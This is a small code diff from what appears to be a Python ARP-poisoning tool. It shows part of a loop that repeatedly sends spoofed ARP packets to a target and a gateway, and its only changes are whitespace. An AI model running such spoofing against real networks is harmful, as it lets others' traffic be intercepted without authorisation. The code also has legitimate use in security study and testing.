@@ -55,9 +55,8 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, interface):
     poison_gateway.hwdst = gateway_mac
 
     print("[+] Starting ARP poisoning on %s (CTRL+C to stop)" % interface)
-
+    
     while True:
-        
         try:
             send(poison_target)
             send(poison_gateway)
@@ -71,7 +70,6 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, interface):
     print("[!] ARP poisoning terminated")
     sys.exit(0)
     
-
 def main(interf, targip, gatewy, outfile):
     # setting interface and disabling verbose
     conf.iface = interf
